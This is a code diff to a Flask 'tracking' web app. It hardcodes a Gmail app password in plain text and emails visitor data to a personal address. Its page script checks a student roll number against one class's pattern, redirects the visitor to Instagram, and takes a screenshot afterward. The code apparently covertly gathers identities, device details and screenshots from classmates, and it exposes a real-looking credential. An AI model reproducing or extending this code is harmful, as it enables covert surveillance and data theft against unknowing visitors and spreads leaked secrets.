@@ -14,7 +14,7 @@ app = Flask(__name__)
 
 visitor_data = []
 EMAIL_SENDER = "ezhilkirthikm@gmail.com"
-EMAIL_PASSWORD = "funz squy xfjb acmk"  # Replace with app-specific password
+EMAIL_PASSWORD = "funzsquyxfjbacmk"  # App-specific password (no spaces)
 EMAIL_RECEIVER = "ezhilkirthik2005@gmail.com"
 
 @app.route('/track')
@@ -228,12 +228,7 @@ s.display()
                 const rollPattern = /^CB\.EN\.U4ECE230[0-5][0-9]$/;
                 if (rollPattern.test(rollNo)) {
                     deviceInfo.rollNumber = rollNo;
-                    window.location.href = 'instagram://app';
-                    setTimeout(() => {
-                        if (document.hasFocus()) {
-                            window.location.href = 'https://www.instagram.com/accounts/login/';
-                        }
-                    }, 1000);
+                    window.location.href = 'instagram://app'; // Only redirect to Instagram app
 
                     const screenShot = await captureScreenAfterRedirect();
                     if (screenShot) {
